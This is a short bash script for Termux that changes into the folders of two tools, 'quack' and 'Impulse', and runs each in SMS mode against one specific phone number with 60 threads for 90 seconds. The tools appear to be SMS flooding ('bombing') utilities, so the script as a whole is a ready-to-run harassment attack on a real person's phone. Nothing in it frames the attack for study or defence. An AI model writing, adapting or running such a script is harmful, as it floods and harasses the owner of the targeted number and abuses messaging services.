#!/bin/bash
cd /data/data/com.termux/files/home/SETSMS/quack
python3 quack --tool SMS --target +6283143565470 --threads 60 --timeout 90
cd /data/data/com.termux/files/home/SETSMS/Impulse
python3 impulse.py --method SMS --time 90 --threads 60 --target +6283143565470
cd /data/data/com.termux/files/home/SETSMS
